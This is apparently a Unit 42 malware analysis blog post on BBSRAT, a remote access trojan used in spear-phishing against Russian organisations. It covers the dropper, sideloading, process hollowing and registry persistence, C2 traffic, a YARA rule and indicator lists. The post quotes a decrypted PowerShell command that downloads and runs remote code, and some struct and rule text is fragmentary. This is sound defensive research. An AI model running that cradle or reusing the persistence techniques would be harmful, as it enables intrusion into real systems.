4POSTED BY: Bryan Lee and Josh Grunzweig on December 22, 2015 5:00 PMFILED IN: Malware, Unit 42 TAGGED: AutoFocus, BBSRAT, Microsoft Office, PlugX, Roaming TigerIn late 2014, ESET presented an attack campaign that had been observed over a period of time targeting Russia and other Russian speaking nations, dubbed “Roaming Tiger”. The attack was found to heavily rely on RTF exploits and at the time, thought to make use of the PlugX malware family.ESET did not attribute the attacks to a particular attack group, but noted that the objective of the campaign was espionage and general information stealing. Based on data collected from Palo Alto Networks AutoFocus threat intelligence, we discovered continued operations of activity very similar to the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a concentration of attacks in late October and continuing into December.The adversaries behind these attacks continued to target Russia and other Russian speaking nations using similar exploits and attack vectors. However, while the malware used in these new attacks uses similar infection mechanisms to PlugX, it is a completely new tool with its own specific behavior patterns and architecture. We have named this tool “BBSRAT.”As described in earlier reports on “Roaming Tiger”, the attack observed in August 2015 used weaponized exploit documents that leave Russian language decoy document files after infecting the system. The files exploit the well-known Microsoft Office vulnerability, CVE-2012-0158, to execute malicious code in order to take control of the targeted systems.Figure 1 Spear-phishing email delivering BBSRATIn one case, the adversary impersonated an individual from the organization Vigstar, a Russian- based research organization in charge of the development of satellite communications and special purpose wireless devices for the Russian Federation’s defense and security agencies. The targeted email address appeared to be a Gmail account associated with Vigstar as well, and was found on a job board website for a job opening at Vigstar.The rough translation of the body of the email is as follows:I send you a “list of international exhibitions of military, civil and dual-purpose, conducted in 2015 on the territory of the Russian Federation and foreign states.” Waiting for your reply!Figure 2 confirms that the decoy document that opens after the malware infects the system is indeed a list of international exhibitions that were conducted on Russian territory in 2015.Get Updates Sign up to receive the latest news, cyber threat intelligence and research from Unit 42.Business EmailSubmitSelect a CategorySelect a MonthMORE →ProxyBack Malware Turns User Systems Into Proxies Without Consent posted by Jeff White on December 23, 2015 2016 Predictions #13: Security with Agility for Firewalls and Applications posted by Glenn Dasmalchi on December 23, 2015 The Cybersecurity Canon: Information Warfare: Chaos on the Electronic Superhighway posted by Palo Alto Networks on December 23, 2015 BBSRAT Attacks Targeting Russian Organizations Linked to Roaming Tiger posted by Bryan Lee on December 22, 2015 Do Organizational Changes Improve Cloud Security? posted by Matt Keil on December 22, 2015MORE →Figure 2 Decoy document that is opened after the malicious document has infected the systemIn more recent months, we have identified several other potential Russian victims using AutoFocus. Analysis of the command and control (C2) infrastructure shows that the newly discovered samples of BBSRAT used the same C2 domains as previously published in the “Roaming Tiger” campaign, including transactiona[.]com and futuresgold[.]com. Interestingly, all of the previously published C2 domains have significant overlap amongst the hashes and IPs while C2s for BBSRAT contain no overlap at all. This may indicate that for the newer attack campaign using BBSRAT, the adversary may have deployed purpose-built variants and/or infrastructure for each of the intended targets.Figure 3 Command and control infrastructureBBSRAT is typically packaged within a portable executable file, although in a few of the observed instances, a raw DLL was discovered to contain BBSRAT. When the dropper first runs, it will generate a path in the %TEMP% directory. The generated filename is 10-16 uppercase alphabetic characters, and ends with a ‘.TMP’ file extension. The dropper will continue to write an embedded cab file in this location.Figure 4 Header of CAB file dropped by BBSRATThe malware will proceed to create one of the following directories depending on what version of Microsoft Windows is running on the target machine:%ALLUSERSPROFILE%\SSONSVR%ALLUSERSPROFILE%\Application Data\SSONSVRUsing the built-in expand.exe utility provided by Microsoft Windows, the dropper executes the following command, which will expand the CAB file and write the results to the provided directory:expand.exe “%TEMP%\[temp_file]” Destination “[chosen_path]\SSONSVR”This results in the following three files being written to the SSONSVR directory:aclmain.sdbpnipcn.dllssonsvr.exeThe ‘ssonsvr.exe’ file is a legitimate Citrix executable that will be used to sideload the malicious ‘pnipcn.dll’ file. The ‘aclmain.sdb’ file contains code that will eventually be loaded by the ‘pnipcn.dll’ file.The malware finally executes ‘ssonsvr.exe’ via a call to ShellExecuteW.Figure 5 Execution flow of dropper expanding CAB fileWhen ‘ssonsvr.exe’ is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path to msiexec.exe, by expanding the following environment string:%SystemRoot%\System32\msiexec.exeIt will then spawn a suspended instance of msiexec.exe in a new process. The malware proceeds to load code from the ‘aclmain.sdb’ file and performs process hollowing against this instance of msiexec.exe prior to resuming the process.Figure 6 Sideloading execution flowIn order to ensure persistence, the following registry key is written on the victim’s machine:HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe : [path_to_ssonsvr.exe]In the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed via a downloader that used the Invoke-ReflectivePEInjection.ps1 script from the PowerSploit framework.When the downloader executes, it will first decrypt the following two strings using a 5-byte XOR key of “\x01\x02\x03\x04\x05”:“powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(‘url′);Invoke-ReflectivePEInjection - PEUrl url”“C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell -exec bypass -c IEX (New- Object Net.WebClient).DownloadString(‘url′);Invoke- ReflectivePEInjection -PEUrl url”These strings are then sequentially executed via calls to WinExec. As we can see, the second command is specifically crafted to run on 64-bit versions of Microsoft Windows. The commands in question will download an executable file and run it within the context of the powershell process.When the above commands are executed, the downloader will initially download the ‘IR.ps1’ powershell script from the specified URL:Figure 7 Downloader downloading the Invoke-ReflectivePEInjection PowerSploit scriptThis Powershell script appears to have been pulled directly from the PowerSploit framework, with no modifications made. The malware then invokes this script with a URL that points to an additional executable file. This downloaded executable contains a copy of the BBSRAT malware family.The downloader proceeds to drop either a 32-bit or 64-bit DLL file that will execute the two previously stated Powershell commands when the DLL is loaded. This DLL is dropped to one of the following locations:%SYSTEMROOT%\web\srvcl32.dll%APPDATA%\web\srvcl32.dllAdditionally, the following registry keys are set depending on the system’s CPU architecture:HKU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3- 0c966feabec1}\InprocServer32\ThreadingModel – “Both” HKU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3- 0c966feabec1}\InprocServer32\Default – [path_to_srvcl32.dll]HKLM\SOFTWARE\Classes\CLSID\{F3130CDB-AA52-4C3A-AB32- 85FFC23AF9C1}\InprocServer32\ThreadingModel – “Both” HKLM\SOFTWARE\Classes\CLSID\{F3130CDB-AA52-4C3A-AB32- 85FFC23AF9C1}\InprocServer32\Default – [path_to_srvcl32.dll]The COM object for {42aedc87-2188-41fd-b9a3-0c966feabec1} is specific to ‘MruPidlList’, while the COM object for {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} is specific to ‘Microsoft WBEM New Event Subsystem’. This ensures that the DLL specified will load when Microsoft Windows starts. It is a technique that was used by the ZeroAccess rootkit when it initially surfaced.After being loaded using one of the two techniques discussed, BBSRAT malware begins execution by loading the following libraries at runtime:ntdll.dllkernel32.dlluser32.dlladvapi32.dllgdi32.dllws2_32.dllshell32.dllpsapi.dllSecur32.dllWtsApi32.dllNetapi32.dllVersion.dllCrypt32.dllWininet.dllThe following mutex is then created to ensure a single instance of BBSRAT is running at a given time:Global\GlobalAcProtectMutexThroughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as seen in the example below demonstrating BBSRAT making a call to the WSAStartup function:Figure 8 BBSRAT calling WSAStartup functionThe malware proceeds to parse the stored embedded network configuration and spawns a series of threads responsible for network communication. This includes a series of HTTP or HTTPS requests, such as the following:GET /bbs/1/forum.php?sid=1 HTTP/1.1 Cookie: A46A8AA9-D7D6-43FB-959DC96E Content-Length: User-Agent: Mozilla/4.0 (compatible; Windows NT 5.1) Connection: Keep-Alive Host: transactiona[.]com Cache-Control: no-cache Accept: */* Content-Type:In the above example, the ‘1’ used both in the URI and the sid GET parameter is a global incremental counter. Every subsequent request made by BBSRAT increments this counter by one. Additionally, all variants of BBSRAT we have found use the same URL for command and control (C2) communication.When first executed, the malware will exfiltrate data about the victim’s machine via a POST request to the ‘/bbs/[counter]/forum.php?sid=[counter]’ URL. All network data sent via POST requests uses a custom binary structure, as defined as the following:1 };The compressed_data field is compressed using the common ZLIB compression algorithm. Additionally, in the event data is being sent via HTTP rather than HTTPS, the following additional encryption algorithm is applied to the POST data:1 8def decrypt(data): out = [] for x in data: t = (ord(x) - 23) t1 = (t ^ 62) t2 = (t1 + 23) & 0xFF out.append(chr(t2)) return outThe following data structure holds the victim’s information that is uploaded by BBSRAT:1 };BBSRAT accepts many possible commands that the C2 server can provide. These commands are sent as a response to the GET beacons that are continually requested via either HTTP or HTTPS. The following commands and sub-commands have been identified:Command Sub-Descriptioncommand Uninstall/Kill Malware Upload Victim Information Execute Command and Return Response Query Service Configuration Change Service Configuration Enumerate Running Processes Kill Process Get Process Information Free Library for Specified Process Execute Command Quietly Send Input to Console Execute Shellcode List Drive Information List File Information For Given Directory List File Information For Given Directory Perform File Operation via SHFileOperation() Shell ExecutePlease refer to the appendix for a full list of identified BBSRAT samples and their associated C2 servers.As in many of the previous articles regarding espionage-motivated adversaries and possible nation-state campaigns, what is being observed in this attack campaign is a continued operation and evolution by the adversary even after its tactics, techniques, and procedures (TTPs) have become public knowledge. Despite the fact that the information about these attackers has been public for over a year, including a listing of many of the command and control servers, they continue to reuse much of their exposed playbook. We urge organizations to use the data from Unit 42 and other threat intelligence sources is paramount to proactively secure themselves and prevent attacks.WildFire properly classifies BBSRAT malware samples as malicious. We have released DNS signatures to block access to the C2 domain names included in this report. AutoFocus users can explore these attacks using the BBSRAT malware family tag.1 author = "Tyler Halfpop" company = "Palo Alto Networks" last_updated = "12-16-15" $sa0 = "%ALLUSERSPROFILE%\\SSONSVR" fullword wide $sa1 = "%ALLUSERSPROFILE%\\Application Data\\SSONSVR" fullword wide $sa2 = "\\ssonsvr.exe" fullword wide $oa0 = { 83 E8 01 88 0C 04 75 F8 8B 44 24 40 89 4C 24 18 89 4C 24 1C $oa1 = { 75 11 5F 5E B8 0D 00 00 00 5B 81 C4 ?? 07 00 00 C2 10 00 53 $sb0 = "%systemroot%\\Web\\" $sb1 = "srvcl32.dll" $ob0 = { B8 67 66 66 66 F7 E9 D1 FA 8B C2 C1 E8 1F 03 C2 8D 04 80 $ob1 = { 8D 84 24 18 02 00 00 50 C7 84 24 1C 02 00 00 94 00 00 00 FF uint16(0) == 0x5a4d and filesize < 300KB and (all of ($sa*) or all }EF5FA2378307338D4E75DECE88158D77 (Sample Analyzed) 2014-12-26 17:17:00 UTCHTTPStransactiona[.]comfinancenewsru[.]net2254A1CA05DB87D9D58A71DDB97C7395 2015-11-04 07:14:33 UTCHTTPSjowwln[.]cocolco[.]compagbine[.]ofhloe[.]comcdaklle[.]housejjk[.]com74A41C62D9EC1164AF82B802DA3E8B3E 2015-11-04 07:14:33HTTPSkop[.]gupdiic[.]comC17534E4B61C08A7646CDC64574B429B 2015-11-04 07:14:33 UTCHTTPSherman[.]eergh[.]comMD5 Server(s)MD5 Server(s)MD5 Server(s)MD5 Server(s)MD5C7C79393E762E7ED925F42D3C899BA607406B11851200D0ADA1A8334107182D636738CE5 B1737F3A1C50CB39CD9938D5EC3B4A6A10B711F17E917886481C38967B93E259 N/AHTTP211.44.42[.]550EA888E970345B2FBFD74B369FE46DDD 2015-08-25 09:33:57 UTCHTTPScrew[.]wichedgecrew[.]comblueway[.]garmio-drive[.]comhelloway[.]floretdog[.]comFA944818A939456A7B6170326C49569F 2015-08-25 09:33:57 UTCHTTPSpanaba[.]empleoy-plan[.]comkop[.]gupdiic[.]compeak[.]measurepeak[.]com896691AE546F498404F5884607D6EB50 N/AHTTP211.44.42[.]55A78B9438117963A9A18B2F056888498B 2014-12-26 17:17:00 UTCHTTP211.44.42[.]55support.yandexmailru[.]krB4927EAC9715014E17C53841FEEDF4E1 2014-12-26 17:17:00 UTCHTTPSSHA1 Server(s)MD5 Server(s)MD5 Server(s)MD5 Server(s)MD5 Server(s)MD5 Protocolkop[.]gupdiic[.]companaba[.]empleoy-plan[.]compeak[.]measurepeak[.]com41A02CAF0A0D32FAD5418425F9973616 2015-08-25 09:33:57 UTCHTTPSherman[.]eergh[.]comprdaio[.]unbrtel[.]comloomon[.]gupdicc[.]comAA59EE1E40D22BD22CEE19B8B6A17DF3 2014-12-26 17:17:00 UTCHTTPSwinwordupdate[.]dynu[.]comB934BF027EC3A9DFCAE9D836D68BAB75 2014-12-26 17:17:00 UTCHTTPStransactiona[.]comfinancenewsru[.]netC2 Server(s)MD5 Server(s)MD5 Server(s)MD5 Server(s)2014-12-26 17:17:00 UTC7533E65A16B4B3BA451A141F389D3A30 Server(s)HTTPSwinwordupdate[.]dynu[.]comadobeflashupdate1[.]strangled[.]netMD5 Server(s)8CD233D3F226CB1BF6BF15ACA52E0E36 2015-09-22 06:16:44 UTCHTTPwww[.]testzake[.]comMD5 2015-09-21 11:59:18 UTCHTTPwww[.]testzake[.]comSHA256 adobeflashupdate1.strangled[.]net cdaklle.housejjk[.]com futuresgolda[.]com herman.eergh[.]com jowwln.cocolco[.]com kop.gupdiic[.]com loomon.gupdiicc[.]com pagbine.ofhloe[.]com panaba.empleoy-plan[.]com peak.measurepeak[.]com prdaio.unbrtel[.]com support.yandexmailru[.]kr systemupdate5.dtdns[.]net wap.gxqtc[.]com wap.hbwla[.]com wap.kylxt[.]com windowsupdate.dyn[.]nu winwordupdate.dynu[.]com www.testzake[.]com www.yunw[.]topName *Email *WebsitePost CommentPrivacy Policy Legal Notices Site Index SubscriptionsCopyright © 2007-2013 Palo Alto Networks 